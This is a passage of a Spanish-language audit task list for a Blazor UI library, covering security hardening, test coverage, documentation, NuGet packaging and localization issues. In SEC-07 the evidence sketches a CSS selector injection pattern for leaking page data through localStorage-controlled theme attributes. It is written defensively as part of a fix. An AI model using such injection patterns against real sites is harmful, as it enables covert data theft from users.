### `SEC-05` — `BUICodeBlock.ComputeHighlight` `catch` genérico silencioso: errores del highlighter no observables

- **Estado**: ✅ Resuelto (commit `4dbc59d`) — `catch` acotado con filtro `when ex is ArgumentException or FormatException or InvalidOperationException or RegexMatchTimeoutException` (criterio 1). `[Inject] ILogger<BUICodeBlock>` registra el fallo como `LogWarning` con `Language` + prefijo de 128 chars del código normalizado (criterio 2). Cualquier excepción fuera del filtro burbujea: bugs reales del highlighter dejan de quedar enmascarados. Criterio 3 (telemetría DoS dedicada para `RegexMatchTimeoutException`) queda cubierto a nivel de log warning — separar a métrica/contador es overkill para un componente cliente; si aparece volumen lo mueve a `SyntaxHighlight` upstream. 46/46 tests de CodeBlock siguen verdes.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/CodeBlock/BUICodeBlock.razor:74-82`.
- **Evidencia**:
  ```csharp
  try { string result = _highlighter.Highlight(...); return (MarkupString)result; }
  catch { return (MarkupString)System.Web.HttpUtility.HtmlEncode(NormalizeIndentation(Code)); }
  ```
  El `catch` vacío captura `OutOfMemoryException`, `ThreadAbortException` (legacy) y cualquier `Exception` sin tipificar. El fallback es correcto desde el punto de vista de seguridad (HtmlEncode), pero enmascara bugs del highlighter (regex catastrophic backtracking, stack overflow en lenguaje desconocido) que el equipo nunca verá en telemetría.
- **Criterios de aceptación**:
  1. Acotar el catch a excepciones esperadas (`ArgumentException`, `FormatException`, `InvalidOperationException`).
  2. Loguear (vía `ILogger<BUICodeBlock>` inyectado como `[Inject]`) con nivel `Warning` + `Language` + primeros 128 chars de `Code`.
  3. Si el highlighter lanza `RegexMatchTimeoutException` u otra indicando DoS, considerar exponer telemetría a CI.
- **Notas**: cambio de severidad posible si un test demuestra que un string patológico puede colgar el render (DoS) — en ese caso subir a Major. Dependencia conceptual con `CdCSharp.BlazorUI.SyntaxHighlight` (el timeout de regex está en esa librería).

### `SEC-06` — Contrato de confianza `MarkupString` no enforced en compile time: consumers pueden pasar input no sanitizado

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Svg/BUISvgIcon.razor:38` (`SvgMarkupSanitizer.Sanitize(Icon)`); `src/CdCSharp.BlazorUI/Components/Generic/CodeBlock/BUICodeBlock.razor:54,70-82`; `src/CdCSharp.BlazorUI/Components/Generic/Svg/SvgMarkupSanitizer.cs` (docstring "callers are expected to supply trusted SVG markup").
- **Evidencia**: `BUISvgIcon.Icon` es `string` y documenta que el caller aporta markup confiable. Un consumer que cablee `Icon="@userInput"` burla la sanitización (el sanitizer corre sobre cualquier string; ver `SEC-02` para los límites del sanitizer). No hay señal en tipo ni en analyzer que fuerce a distinguir fuentes confiables vs. no confiables.
- **Criterios de aceptación**:
  1. Introducir tipo wrapper `TrustedSvgMarkup` (struct readonly con `string Value`) cuya construcción explícita marque intento consciente del caller.
  2. `BUISvgIcon.Icon` acepta `TrustedSvgMarkup` (breaking). Proporcionar `BUIIcons` (catálogo) devolviendo este tipo; analyzer `BUIxxxx` advierte conversión implícita desde `string`.
  3. Documentar en `CLAUDE.md §Security` que ningún parámetro `MarkupString`/`TrustedSvgMarkup` debe recibir input de usuario sin pasar por sanitizer.
- **Notas**: breaking change — planificar en vX+1. Alternativa light: analizador Roslyn de severidad `Warning` que avise cuando un `Icon=` provenga de variable de tipo `string` capturada desde `[Parameter]` sin marcar `[TrustedMarkup]`. Dependencia con `SEC-02` (sanitizer real) y `GEN-11` (release notes del analyzer).

### `SEC-07` — `ThemeInterop.ts` no valida claves de `localStorage`: riesgo de `data-theme` injection si XSS previo

- **Estado**: ✅ Resuelto (cerrado colateralmente por `SEC-04`, commit `3c29682`) — `THEME_ID_PATTERN = /^[a-zA-Z0-9_-]{1,32}$/` aplicado en `isSafeThemeId(value)`. Tanto `initialize(defaultTheme?)` como `setTheme(theme)` filtran via el helper antes de tocar `localStorage` o `setAttribute('data-theme', ...)`. Idéntico patrón replicado en el inline script de `BUIInitializer.razor` (ver SEC-04 closure note). Criterio 3 (tests TS) sin infra de tests TS dedicada — la validación queda cubierta indirectamente por integración: cualquier theme id no-safe cae al fallback (`getSystemPreference()` o `DEFAULT_THEME`).
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Theme/ThemeInterop.ts:16-19,26-28`.
- **Evidencia**:
  ```ts
  const savedTheme = localStorage.getItem(THEME_KEY);
  const theme = savedTheme ?? getSystemPreference();
  document.documentElement.setAttribute('data-theme', theme);
  ```
  `setAttribute('data-theme', X)` con `X` arbitrario no introduce XSS por sí mismo (no se evalúa como JS), pero permite **CSS selector injection** si el atacante controla `localStorage`: un selector con efectos laterales (`[data-theme^="a"] img { content: url(...) }`) exfiltra metadata.
- **Criterios de aceptación**:
  1. En `setTheme(theme)` y `initialize()`, validar `theme` contra regex `/^[a-z0-9][a-z0-9_-]{0,31}$/i` (o contra lista inyectada por el servidor si existe registro).
  2. Si no valida, ignorar y usar `DEFAULT_THEME`.
  3. Tests unitarios de validación (si existen tests de TS — si no, `L10N`/`TEST` debe añadir runtime assertion).
- **Notas**: gemelo del inline script (`SEC-01`/`SEC-04`). Fix idealmente en el mismo PR.

### `SEC-08` — Inputs de formulario no validan server-side: `MaxLength` en cliente no es frontera de seguridad

- **Severidad**: Minor
- **Esfuerzo**: XS (documentación)
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/TextArea/BUIInputTextArea.razor:68,125`; `src/CdCSharp.BlazorUI/Components/Forms/Text/BUIInputText.razor` (ídem si aplica); `src/CdCSharp.BlazorUI/Components/Forms/Number/BUIInputNumber.razor` (min/max/step).
- **Evidencia**: los atributos `maxlength`, `min`, `max`, `step` se emiten al DOM pero un atacante bypasa el UI (fetch directo, devtools, WASM bypass). Actualmente no hay advertencia en docs.
- **Criterios de aceptación**:
  1. Documentar en XML docs de cada parámetro: "UI hint only — enforce on the server".
  2. Añadir sección en `CLAUDE.md §Security` con checklist: inputs tienen `MaxLength`/`MinLength`/`Min`/`Max`/`Step`/`Pattern` declarativos, **no** sanitización.
  3. Cuando `BUIForm` implemente `IValidatableObject`/`DataAnnotations`, recordar que las mismas reglas deben existir server-side.
- **Notas**: no fix de código; es matter de expectativas. Relacionado con `DOC`.

### `SEC-09` — CI no corre `dotnet list package --vulnerable` ni `npm audit` en cada build: vulnerabilidades de dependencias no detectadas

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml`.
- **Evidencia**: `grep -i 'audit\|vulnerable' .github/workflows/publish.yml` → `No matches found`. Las dependencias NuGet (`Microsoft.AspNetCore.Components.Web 10.0.6`, `Microsoft.Extensions.Localization 10.0.6`) y npm (Vite, TypeScript, plugins en `node_modules` generados por `BuildTools`) pueden publicar CVEs sin que el CI lo reporte.
- **Criterios de aceptación**:
  1. Añadir step en `publish.yml` (y en un workflow CI separado corriendo en PR) que ejecute `dotnet list CdCSharp.BlazorUI.slnx package --vulnerable --include-transitive` y falle si detecta `Critical`/`High`.
  2. Step equivalente para npm en `src/CdCSharp.BlazorUI/` (el `package.json` generado por `BuildTools`): `npm audit --audit-level=high`.
  3. Documentar en `CLAUDE.md §CI` la periodicidad mínima (diario o weekly con `schedule:`).
- **Notas**: aplica también a GitHub Actions dependencies (`actions/checkout@v4`, etc.) — considerar `dependabot.yml`.

### `TEST-05` — 203 `[Fact]` en tests `Library/`/`Core/` vs. `[Theory]` + `TestScenarios.All`: convención no aplicada uniformemente

- **Severidad**: Minor
- **Esfuerzo**: S (decisión) + M (refactor si se decide)
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/*.cs`, `Tests/Core/*.cs`, `Tests/Core/BaseComponents/*.cs`.
- **Evidencia**: `grep -c '\[Fact\]'` → 203 ocurrencias en 17 ficheros; mayoría en `Tests/Library/` (CssColorSystemTests, SearchAlgorithmsTests, BUIBorderPresetsTests, ...) y `Tests/Core/BaseComponents/` (BUIComponentAttributesBuilderUnitTests, BUIComponentJsBehaviorBuilderTests). CLAUDE.md exige `[Theory]` + `TestScenarios.All` por defecto "para que cada test corra en Server y WASM".
- **Criterios de aceptación**:
  1. Decidir política: ¿tests que no tocan Blazor context (cálculos puros sobre `CssColor`, `BUIBorderPresets`, `VariantHelper`) deben ser host-agnostic y por tanto `[Fact]` es correcto? — Recomendación: sí.
  2. Documentar en `CLAUDE.md §Testing → Cuándo usar [Fact]`: pure computation sin `BunitContext` es `[Fact]`; cualquier test que instancie `ctx = scenario.CreateContext()` debe ser `[Theory]` + `TestScenarios.All`/`OnlyServer`/`OnlyWasm`.
  3. Auditar los 203 `[Fact]` y migrar los que sí instancian `BlazorTestContextBase` (esperable un subconjunto pequeño).
- **Notas**: fix esencialmente documental + pequeña migración.

### `TEST-06` — 14 usos de `Task.Delay`/`Thread.Sleep` en tests: fuente potencial de flakiness

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/DelayedActionHandlerTests.cs` (8), `Tests/Components/Initializer/BUIInitializerDisposalTests.cs` (2), `Tests/Components/Toast/BUIToastInteractionTests.cs` (1), `Tests/Components/ThemeSelector/BUIThemeSelectorInteractionTests.cs` (3).
- **Evidencia**: `grep -c 'Task\.Delay\|Thread\.Sleep\|await Task\.Yield'` → 14. `DelayedActionHandlerTests` usa delays reales para probar el timeout; `BUIToast`/`BUIInitializer`/`BUIThemeSelector` probablemente esperan animación o debounce. Tests temporales son la causa #1 de flakiness en CI compartida.
- **Criterios de aceptación**:
  1. Introducir `TimeProvider` (FakeTimeProvider de `Microsoft.Extensions.TimeProvider.Testing`) en `DelayedActionHandler` y usarlo en tests → `await Advance(...)` determinista.
  2. Para Toast/Initializer/ThemeSelector: exponer un hook de test que permita avanzar el reloj sin `Task.Delay` real, o invocar la acción final directamente vía reflection/internals.
  3. Auditoría CI: correr la test suite × 10 en CI dedicado y exigir 0 flakes.
- **Notas**: `DelayedActionHandler` ya es sealed y acepta cualquier refactor (ver `src/CdCSharp.BlazorUI.Core/Utilities/DelayedActionHandler.cs`). Dependencia con `ASYNC-10` (mejora del contrato).

### `TEST-07` — Componentes con cobertura mínima (sólo `Rendering`): `BUIModalContainer`, `BUIGridItem`, `BUIBadge` no pasivos documentados

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/{Dialog/BUIModalContainer*, Grid/BUIGridItem*, Badge/BUIBadge*}`.
- **Evidencia**: `BUIModalContainer` y `BUIGridItem` sólo tienen `*RenderingTests.cs`. No está documentado que sean "puramente estructurales" — de hecho `BUIModalContainer` gestiona focus trap (`BUIModalHost` lo usa) y `BUIGridItem` maneja el span reactivo por tamaño. `BUIBadge` parece pasivo pero expone `Variant` y `Size`.
- **Criterios de aceptación**:
  1. `BUIGridItem`: añadir `StateTests` (cambios de span/offset), `AccessibilityTests` (role), y al menos `SnapshotTests`.
  2. `BUIModalContainer`: añadir `InteractionTests` (backdrop click, Esc key), `AccessibilityTests` (focus trap en/out, aria-modal). Ver `A11Y-05`.
  3. `BUIBadge`: al menos `InteractionTests` si expone callbacks; documentar si no.
- **Notas**: cruza con `TEST-03` pero específicamente puntualiza componentes con 1 solo archivo.

### `TEST-08` — Helpers de input-family (`_BUIFieldHelper`, `_BUIInputLoading`, `_BUIInputOutline`, `_BUIInputPrefix`, `_BUIInputSuffix`) sólo con `Rendering`: a11y y estado no cubiertos

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/InputInternals/*.cs`.
- **Evidencia**: sólo 5 ficheros `*RenderingTests.cs`. Estos componentes emiten el `helper-text`/`validation-message` mencionado en `A11Y-09` (aria-live ausente), el `outline` notch, y los addons prefix/suffix. Su correcto `data-bui-floated` toggle y su relación con `EditContext` no están cubiertos.
- **Criterios de aceptación**:
  1. Añadir `_BUIFieldHelper*StateTests` que verifique: sin error renderiza helper-text; con `EditContext.AddValidationResult` renderiza validation-message con `data-bui-error="true"`.
  2. `_BUIInputOutline*StateTests` que verifique transición a `data-bui-floated="true"` con label visible.
  3. `_BUIInputLoading*` asociado con `IHasLoading` — verificar que el spinner sólo aparece con `Loading=true`.
  4. `AccessibilityTests` para `_BUIFieldHelper` confirmando `aria-live` (post `A11Y-09`).
- **Notas**: dependencia con `A11Y-09` (fixes a11y primero); tests luego garantizan no regresión.

### `TEST-09` — `VariantTests` ausente en ≥ 15 componentes con variantes públicas: cobertura del contrato de variantes incompleta

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/**`.
- **Evidencia**: componentes con API de variantes (exposición de `Variant` parameter) y sin `*VariantTests.cs`: `BUINotificationBadge`, `BUIColorPicker`, `BUIInputColor`, `BUICultureSelector`, `BUIDataColumn`, `BUIDataGrid`, `BUIDialog`, `BUIDrawer`, `BUIGrid`, `BUIDatePicker`, `BUIInputDateTime`, `BUITimePicker`, `BUIInputNumber`, `BUISidebarLayout`, `BUIStackedLayout`, `BUISwitch`, `BUIThemeEditor`, `BUIThemePreview`, `BUITreeMenu`, `BUITreeSelector`, `BUICodeBlock` — al menos 20 candidatos. El patrón canónico (CLAUDE.md §Variant tests) es: crear `Custom("X")` variant, registrarla vía `AddBlazorUIVariants`, asertar que el fragment custom corrió.
- **Criterios de aceptación**:
  1. Cruzar lista de componentes con `Variant` parameter (grep `Parameter.*Variant`).
  2. Para cada componente con variantes, añadir `<Component>VariantTests.cs` con al menos un test `Should_Render_Custom_Variant`.
  3. Registrar falsos positivos: si un componente acepta `Variant` sólo como pass-through sin variants registradas, documentar.
- **Notas**: alto volumen pero tests son template-copy. Probable que algunos componentes ni siquiera tengan variantes registradas — cerrarlos como "N/A".

### `DOC-05` — Docs site WASM sólo cubre 27 componentes; faltan layouts (`BlazorLayout`, `SidebarLayout`, `StackedLayout`), `Initializer`, `ThemeEditor`, `DataColumn`, `Patterns`

- **Severidad**: Minor
- **Esfuerzo**: L
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Pages/Components/**`.
- **Evidencia**: `ls docs/CdCSharp.BlazorUI.Docs.Wasm/Pages/Components/` → 27 páginas razor. La librería expone 62 ficheros con `[Parameter]`. Gap prioritarios identificados:
  - `BUIBlazorLayout`, `BUISidebarLayout`, `BUIStackedLayout` (layouts - sin docs)
  - `BUIInitializer` (crítico, usuarios necesitan saber que debe ir en `App.razor`)
  - `BUIThemeEditor` (actualmente implícito en `ThemeGeneratorPage`)
  - `BUIDataColumn` (implícito en `DataGridPage`, pero tiene API propia)
  - `BUIBasePattern`/`BUIDateTimePattern` (sin docs)
  - `BUITab` (children de Tabs)
  - Internals de input-family con API pública (`_BUIFieldHelper` aparece en el CSS scope pero consumer no interactúa)
- **Criterios de aceptación**:
  1. Crear página por cada componente público con `[Parameter]` — template: descripción, ejemplo mínimo, tabla de parámetros (generada auto si posible), variantes.
  2. Link desde `GettingStarted.razor` con índice completo.
  3. CI gate: step que verifica que la lista de componentes en `src/` tiene página correspondiente en `docs/` (grep + diff).
- **Notas**: dependencia con `DOC-02` (XML docs son la fuente para las tablas de parámetros). Dependencia con `DOCS-WASM-xx` (performance del docs site).

### `DOC-06` — Metadata en español/mezclada: `<Description>Librería de componentes Blazor</Description>` y comentarios `///` en castellano

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/*.csproj:8`; comentarios dispersos en `src/`.
- **Evidencia**: NuGet ecosystem espera metadata en inglés (discoverability). `Description` actual es "Librería de componentes Blazor" (español). Hay comentarios `//` y `///` en castellano mezclados con XML docs en inglés.
- **Criterios de aceptación**:
  1. Política documentada en `CLAUDE.md`: código + XML docs en **inglés**; tareas internas / ANALYSIS.md / TASKS.md en **español**.
  2. `<Description>` → "Blazor component library with themeable primitives, forms, data collections, and dialogs for .NET 10".
  3. Pass inicial: traducir `<Description>` y comentarios en APIs públicas; comentarios internos pueden mantenerse en el lote de `DOC-02`.
- **Notas**: decisión de política. Si el proyecto quiere ser bilingüe, al menos el metadata NuGet es inglés por convención.

### `DOC-07` — `<example>`/`<code>` tags inexistentes: XML docs sin ejemplos ejecutables

- **Severidad**: Minor
- **Esfuerzo**: L
- **Alcance**: todos los componentes `BUI*` de `src/CdCSharp.BlazorUI/Components/**`.
- **Evidencia**: `grep -c '/// <example>' src/` → 2 ocurrencias, ambas en `ServiceCollectionExtensions.cs`. Intellisense útil requiere `<example>` + `<code>` para mostrar snippets de uso — especialmente para parámetros no-obvios como `Variant`, `EventCallback` signatures, y composición (`BUIDialog` + `BUIModalHost`).
- **Criterios de aceptación**:
  1. Añadir al menos 1 `<example>` con `<code>` block al `<summary>` de tipo de cada componente público principal (mismo top-N que `DOC-02`).
  2. Los ejemplos deben compilar: tests unitarios que extraen `<code>` y los compilan con Roslyn (opcional, puede verse como Polish en F3).
- **Notas**: depende de `DOC-02`. Los ejemplos viven junto al `<summary>` del tipo, no junto a cada `<Parameter>`.

### `DOC-08` — Enums y tipos auxiliares públicos (`CssColor`, `HsvColor`, `PaletteColor`, `BorderCssValues`, `RowStylePattern`, `StepButtonPlacement`) sin `<remarks>` de uso

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Css/*.cs`; `src/CdCSharp.BlazorUI/Components/**/*Enums.cs`.
- **Evidencia**: `grep '/// <summary>' src/CdCSharp.BlazorUI.Core/Css/CssColor.cs` → 33 hits (miembros individuales) pero `FeatureDefinitions`, `BorderCssValues` tienen summaries mínimos sin `<remarks>` que expliquen el modelo (ejemplo: `CssColor` acepta rgba/hsl/hex — no está documentado en summary). `RowStylePattern` (`DataGrid/RowStylePattern.cs:1`) tiene 1 summary para toda la clase sin explicar el patrón.
- **Criterios de aceptación**:
  1. Para cada tipo público auxiliar, añadir `<remarks>` explicando: cuándo usarlo, contract con otros tipos, ejemplo inline corto.
  2. Especial atención a `CssColor` (parser complejo), `HsvColor` / `HsvSpace` (modelo de color), `PaletteColor` (relación con theme), `BorderCssValues` (modelo de bordes por lado).
- **Notas**: más pequeño que `DOC-02` pero importante para consumer que quiere extender themes/cssvars.

### `DOC-09` — `CLAUDE.md` contiene decisiones desactualizables: política de auditar coincidencia con código al cierre de F2

- **Severidad**: Minor
- **Esfuerzo**: S (una pasada al cierre de F2)
- **Alcance**: `CLAUDE.md`.
- **Evidencia**: `CLAUDE.md §Component architecture` describe `BUIComponentBase`, `BUIInputComponentBase`, `IHas*` contracts, `BUIComponentAttributesBuilder` — pero varias tareas F2 (ej. `PERF-01`, `PERF-02`, `A11Y-09`) cambian contratos (ShouldRender, PatchVolatile masks, aria-live defaults). Sin una pasada final de sincronización, `CLAUDE.md` queda desalineado con el código real.
- **Criterios de aceptación**:
  1. Al cerrar cada bloque de tareas F2 (post-`ARCH`, post-`BASE`, post-`PERF`, post-`A11Y`), editar `CLAUDE.md` reflejando los cambios.
  2. Al cerrar F2 completa, pasar todo `CLAUDE.md` contra el código (sección por sección): sample commands, architecture description, CSS architecture, async conventions, testing conventions.
  3. Añadir nota en `CLAUDE.md` con fecha de última sincronización.
- **Notas**: meta-task. Relacionado con `CLAUDE-xx` (acumulador de ítems descubiertos).

### `PKG-05` — `Types/Debug/DebugPanel.ts` declarado como `<Content Include>` en csproj: el source TS viaja al paquete

- **Estado**: ✅ Resuelto (cerrado colateralmente por `BLD-09`, commit `487d00f`) — el `<Content Include="Types\Debug\DebugPanel.ts">` se eliminó junto con todo el subsystem `Debug/` del repo (criterio 1). `grep -n Debug src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj` → 0 hits. Criterio 2 verificado en BLD-09 (`dotnet pack -c Release` confirma 0 archivos `Debug*` en el `.nupkg`). Criterio 3 (otros `Types/**/*.ts` no aparecen como `<Content>`) confirmado por inspección del csproj — sólo Razor SDK + StaticWebAssets manejan el resto via convención de carpetas.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:13-16`.
- **Evidencia**:
  ```xml
  <Content Include="Types\Debug\DebugPanel.ts">
    <ExcludeFromSingleFile>true</ExcludeFromSingleFile>
    <CopyToPublishDirectory>PreserveNewest</CopyToPublishDirectory>
  </Content>
  ```
  `.ts` source dentro del paquete no aporta nada al consumer (consumer sólo usa el `.min.js` compilado). El package también incluye `wwwroot/js/Types/Debug/DebugPanel.min.js` (34 KB, ver baseline) via static web assets. Cross con `BLD-09` (DebugPanel en prod).
- **Criterios de aceptación**:
  1. Eliminar el `<Content Include="Types\Debug\DebugPanel.ts">` del `.csproj`.
  2. Verificar post-pack con `unzip -l .nupkg` que no aparece ningún `.ts` en el paquete.
  3. Revisar otros `Types/**/*.ts` — están en `<Folder>` entries pero no como `<Content>`; confirmar que el Razor SDK no los incluye por default.
- **Notas**: trivial fix.

### `PKG-06` — `*.js.map` source maps empaquetados en `wwwroot/js/**`: duplican tamaño del paquete

- **Estado**: ✅ Resuelto (commit `4207ea3`, criterio 2 aplicado) — nuevo target `StripJsMapsForRelease` en `Dev.targets`, condicionado a `$(Configuration) == 'Release'`, que borra de disco `wwwroot/js/**/*.js.map` **antes** de que el Razor SDK ejecute `GetStaticWebAssetsBuildInputs`/`GenerateStaticWebAssetsManifest`. En Debug los maps se conservan para `dotnet watch` / step-into local. `dotnet pack -c Release` verificado: el `.nupkg` resultante contiene los 10 `.min.js` sin ningún `.js.map` (antes: 10 + 10 = 20 artefactos; ahora: 10). Criterio 1 (empaquetar maps en `.snupkg`) descartado por diseño — el `.snupkg` de NuGet es para debug symbols .NET (PDB), no un transportador general; la convención idiomática para TS source-maps es side-by-side con el bundle o regenerar localmente. Criterio 3 (doc CLAUDE.md) queda como follow-up con JS-11 (toggle Debug/Release global).
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets:33`.
- **Evidencia**: `<Content Include="$(BlazorUIProjectPath)\wwwroot\js\**\*.js.map" />` en el targets. Source maps son útiles durante desarrollo local pero empaquetar 45 KB de `.js.map` en producción para 45 KB de `.js` duplica asset transfer en Wasm (el consumer los sirve estáticamente). Static web assets de NuGet son cacheados por el browser pero entran en el `dotnet publish` size.
- **Criterios de aceptación**:
  1. Empaquetar los `.js.map` **sólo** en el paquete de símbolos (`.snupkg`, post `PKG-02`) o en un paquete debug separado.
  2. Production `.nupkg` contiene sólo `.js` (no `.map`).
  3. Documentar en `CLAUDE.md §Build pipeline` cómo activar maps en desarrollo.
- **Notas**: relación con bundle size (baseline: 11 832 bytes de los resto JS módulos + 34 KB DebugPanel).

### `PKG-07` — `dotnet pack` warnings `NU5xxx` no auditados: `NU5128`, `NU5100`, `NU5104` pueden indicar empaquetado inválido

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml:183-219`; logs de `dotnet pack`.
- **Evidencia**: no hay grep de warnings específicos `NU5xxx` post-pack. Estos incluyen:
  - `NU5104`: "A stable release of a package should not have a prerelease dependency" — relevante si alguna transitiva es preview.
  - `NU5128`: "Some target frameworks declared in the dependencies group ... don't have exact matches in the lib/ folder" — común cuando `TargetFrameworks` no alinea con dependencias.
  - `NU5100`: "The assembly ... is placed in non-standard location" — si `Content Include` mal configurado.
  - `NU5110/NU5111`: assembly naming outside default paths.
- **Criterios de aceptación**:
  1. Capturar `dotnet pack` output y grep `NU5`.
  2. Fallar CI si warnings detectados (no todos son accionables; ajustar `NoWarn` con justificación documentada).
  3. Revisión manual de baseline de warnings NU5xxx al correr pack hoy.
- **Notas**: depende de `PKG-04` (step de validación estructural es mismo lugar).

### `PKG-08` — `ToolCommandName=blazorui-buildtools` sin prefijo del owner: colisión con tools de otros paquetes

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/CdCSharp.BlazorUI.BuildTools.csproj:9`.
- **Evidencia**: `<ToolCommandName>blazorui-buildtools</ToolCommandName>`. Si el usuario hace `dotnet tool install -g blazorui-buildtools` y ya tiene otro tool homónimo (p. ej. `blazorui-buildtools` de un fork, o el nombre colisiona con alias del shell), sobreescribe sin aviso.
- **Criterios de aceptación**:
  1. Renombrar a `cdcsharp-blazorui-buildtools` o `cdc-blazorui-build`.
  2. Actualizar documentación y `.targets` que invoquen el tool (si alguno).
- **Notas**: depende de `PKG-03` (decisión sobre si publicar como tool).

### `PKG-09` — `<PackageType>` no declarado explícitamente: BuildTools es `DotnetTool`, el resto `Dependency`

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: los 5 csproj publicables.
- **Evidencia**: BuildTools es `PackAsTool=true` → SDK infiere `PackageType=DotnetTool`. Los restantes infieren `Dependency`. Explícito es mejor: NuGet client filtra por tipo y los tools no deben aparecer en `dotnet add package` searches normales.
- **Criterios de aceptación**:
  1. Añadir `<PackageType>Dependency</PackageType>` a Core, BlazorUI, SyntaxHighlight, Localization.Server, Localization.Wasm.
  2. Añadir `<PackageType>DotnetTool</PackageType>` a BuildTools (redundante con `PackAsTool` pero explícito).
- **Notas**: cosmético, ayuda a NuGet.org categorización.

### `L10N-05` — `LocalizationSettings` duplicado: dos clases con mismo nombre en distintos namespaces, sutil diferencia (`CultureCookieName` sólo en Server)

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Server/LocalizationSettings.cs`; `src/CdCSharp.BlazorUI.Localization.Wasm/LocalizationSettings.cs`.
- **Evidencia**: ambas clases `public class LocalizationSettings` con campos comunes (`DefaultCulture`, `ResourcesPath`, `SupportedCultures`). Server añade `CultureCookieName`. Consumer que referencie ambos paquetes recibe `ambiguous reference`.
- **Criterios de aceptación**:
  1. Extraer `LocalizationSettingsBase` (o `LocalizationSettings`) a `CdCSharp.BlazorUI.Core` con los campos comunes.
  2. Server: sub-clase `ServerLocalizationSettings : LocalizationSettings` que añade `CultureCookieName`.
  3. Wasm: usa la base directamente o sub-clase marker con overrides.
  4. Consumer que referencie ambos paquetes puede aliasar sin colisión.
- **Notas**: dependencia con `L10N-01` (consolidación).

### `L10N-06` — `GetFlag()` switch con 28 cultures hardcoded: no extensible ni configurable por consumer

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.{Server,Wasm}/Components/BUICultureSelector.razor:134-165` (Server) y :122-153 (Wasm).
- **Evidencia**: 28 `case "XX-YY" => "🇫🇱"` hardcoded. Si consumer quiere mostrar `ca-ES`, `eu-ES`, `gl-ES` (regionales España no incluidas) o cualquier cultura no listada, recibe `"🌐"`. No hay override, no hay `Dictionary<string, string> Flags` como parámetro.
- **Criterios de aceptación**:
  1. Extraer el switch a una clase estática `CultureFlags` con método `TryGetFlag(string cultureName, out string flag)`.
  2. Exponer parámetro en `BUICultureSelector`: `[Parameter] public Func<CultureInfo, string>? FlagResolver { get; set; }` que sobrescribe la lógica default.
  3. `LocalizationSettings` puede tener `public Dictionary<string, string> CustomFlags { get; set; }`.
- **Notas**: opción alternativa: usar SVG flags assets en lugar de emoji (mejor fidelity cross-platform — emoji rendering varía en Windows/macOS/Linux). Deferir SVG a Polish/F3.

### `L10N-07` — `/Culture/Set` endpoint hardcoded en `CultureEndpointStartupFilter`: colisión posible con rutas del consumer

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Server/CultureEndpointStartupFilter.cs:31`.
- **Evidencia**: `if (context.Request.Path.Equals("/Culture/Set", ...))`. Consumer que tenga un controller `/Culture/Set` pierde (middleware corta antes), o viceversa. También consumer con un `Culture/Set` como parte de un content slug.
- **Criterios de aceptación**:
  1. Exponer `LocalizationSettings.CultureEndpointPath` (default `"/BlazorUI/Culture/Set"`).
  2. `CultureEndpointStartupFilter` usa `settings.CultureEndpointPath`.
  3. `BUICultureSelector.SetCultureAsync` construye el URI con `LocalizationSettings.CultureEndpointPath` (inyectado).
- **Notas**: cross con `SEC-xx` — un endpoint público que escribe cookies sin validar redirect URI es potencial open-redirect. Validar que `redirectUri` sea relativo.

### `L10N-08` — `Navigation.NavigateTo(forceLoad: true)` en ambos paths: pierde SPA state al cambiar cultura

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `Server/Components/BUICultureSelector.razor:119-121`; `Wasm/Components/BUICultureSelector.razor:110-111`.
- **Evidencia**: ambos hacen full reload. Para Server (cambio de cookie) es razonable porque la cultura sólo se aplica en el siguiente request. Para Wasm, tras `LocalizationPersistence.SetStoredCultureAsync`, podría actualizarse `CultureInfo.DefaultThreadCurrent{,UI}Culture` + `StateHasChanged` global + disparar un `OnCultureChanged` event — sin reload. Un SPA que pierde form state, modal abierto, scroll position en cada cambio de idioma es UX pobre.
- **Criterios de aceptación**:
  1. Wasm: tras `SetStoredCultureAsync`, actualizar `CultureInfo.DefaultThread*` y publicar evento `CultureChanged` vía `IMediator`/`IObservable<CultureInfo>`; la app consumer se suscribe y llama `StateHasChanged`.
  2. Server: documentar que el reload es necesario por la arquitectura de RequestLocalization cookie-based.
  3. Parámetro opcional `[Parameter] public bool ForceReload { get; set; } = false;` (Wasm) / `= true` (Server).
- **Notas**: cross con `A11Y-xx` — un reload inesperado rompe lectores de pantalla (re-anuncia toda la página).

### `L10N-09` — `WasmLocalizationPersistence._module` es `IJSObjectReference` sin disposal + silent `catch` en `GetStoredCultureAsync`

- **Severidad**: Minor
- **Esfuerzo**: S
